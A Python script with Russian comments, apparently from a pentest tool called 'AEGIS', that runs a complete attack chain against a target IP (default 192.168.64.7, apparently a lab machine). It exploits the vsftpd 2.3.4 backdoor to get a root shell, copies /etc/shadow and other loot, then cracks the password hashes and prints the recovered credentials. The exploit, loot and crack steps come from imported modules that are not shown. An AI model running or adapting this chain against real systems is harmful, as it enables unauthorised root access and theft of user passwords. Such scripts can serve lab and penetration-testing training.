#!/usr/bin/env python3
# scripts/full_chain.py — полный цикл: exploit → loot → crack

import os
import sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.exploiter import run_all
from modules.looter import loot_via_backdoor
from modules.cracker import crack_text


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "192.168.64.7"

    print(f"\n{'='*60}")
    print(f"  AEGIS — полный цикл эксплуатации")
    print(f"  Цель: {target}")
    print(f"{'='*60}\n")

    # Шаг 1: эксплуатация
    print("[1/3] Эксплуатация vsftpd backdoor...")
    ports = [{"port": 21, "service": "ftp", "version": "vsftpd 2.3.4"}]
    results = run_all(target, ports, confirm=True)

    if not results or not results[0]["result"]["success"]:
        print("[-] Эксплуатация не удалась")
        return

    print("[+] Shell получен\n")

    # Шаг 2: loot через backdoor
    print("[2/3] Сбор артефактов через root shell...")
    loot = loot_via_backdoor(target)
    if not loot["success"]:
        print(f"[-] Loot не удался: {loot['log']}")
        return
    print(f"[+] Loot в {loot['output_dir']}")
    print(f"[+] id: {loot['id_out']}\n")

    # Шаг 3: взлом хешей
    print("[3/3] Взлом хешей из /etc/shadow...")
    shadow_path = loot["shadow_path"]
    with open(shadow_path) as f:
        shadow_text = f.read()

    if not shadow_text.strip():
        print("[-] shadow пуст")
        return

    result = crack_text(shadow_text, loot["output_dir"], label="shadow", max_runtime=120)
    print(f"[+] Найдено хешей: {result['count']}")
    print(f"[+] Формат: {result['format']}")

    if result["cracked"]:
        print(f"\n{'='*60}")
        print(f"  ВЗЛОМАНО:")
        for user, pw in result["cracked"]:
            print(f"    {user}:{pw}")
        print(f"{'='*60}\n")
    else:
        print("[-] Пароли не найдены")


if __name__ == "__main__":
    main()